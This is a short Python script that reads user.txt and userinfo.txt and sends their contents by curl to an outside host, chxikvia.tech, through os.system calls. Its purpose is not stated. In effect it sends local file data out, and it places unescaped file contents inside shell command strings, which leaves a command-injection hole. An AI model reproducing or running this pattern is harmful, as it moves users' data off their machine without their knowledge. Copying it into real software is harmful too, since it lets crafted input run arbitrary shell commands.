import os

def main():
    with open("user.txt", "r") as file:
        content = file.read().strip()
        
    filename = f"'https://chxikvia.tech/api/42c?program=info%20{content}'"
    os.system(f"curl {filename}")

    with open("userinfo.txt", "r") as file:
        content = file.read().strip().split()

    formatted_content = "%20".join(content)
    filename = f"'https://chxikvia.tech/api/42c?program=userinfo%20{formatted_content}'"
    os.system(f"curl {filename}")

if __name__ == "__main__":
    main()
